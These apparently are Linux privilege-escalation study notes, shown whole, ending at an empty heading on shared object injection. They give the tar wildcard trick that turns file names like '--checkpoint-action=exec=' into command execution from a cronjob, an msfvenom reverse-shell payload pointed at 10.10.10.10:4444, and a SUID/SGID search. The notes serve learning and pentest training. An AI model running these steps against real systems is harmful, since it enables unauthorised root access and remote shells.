- Assume we have the following cronjob:
```bash
cd /home/user
tar czf /tmp/backup.tar.gz *
```
*Note*: This command means that all the files in `/home/user` will be compressed to `/tmp/backup.tar.gz`

- The tar command can also take a useful option(`-checkpoints`) as shown below:
```bash
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

- This means we can exploit the first command to spawn a shell by creating the following 2 files in `/home/user`
```bash
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec={command-to-execute}
```

- To create a reverse shell using `msfvenom` we use the following command:
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
```

- To find all the SUID/SGID executables on a Debian machine we use the following command:
```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```


### Shared Object Injection

